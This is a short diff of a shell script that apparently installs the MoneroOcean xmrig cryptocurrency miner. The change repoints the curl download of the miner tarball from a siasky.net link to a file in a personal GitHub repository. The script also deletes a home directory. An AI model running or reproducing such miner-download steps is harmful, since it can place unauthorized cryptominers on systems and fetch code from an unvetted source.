@@ -230,8 +230,8 @@ echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://siasky.net/_AB9c6l7yO3E2NRXOqhfWKwNP97J_YbfEANKBnoh580bIA" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://siasky.net/_AB9c6l7yO3E2NRXOqhfWKwNP97J_YbfEANKBnoh580bIA file to /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/MilenaCorol/my/master/xmrig.tag.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/MilenaCorol/my/master/xmrig.tag.gz file to /tmp/xmrig.tar.gz"
   exit 1
 fi
 
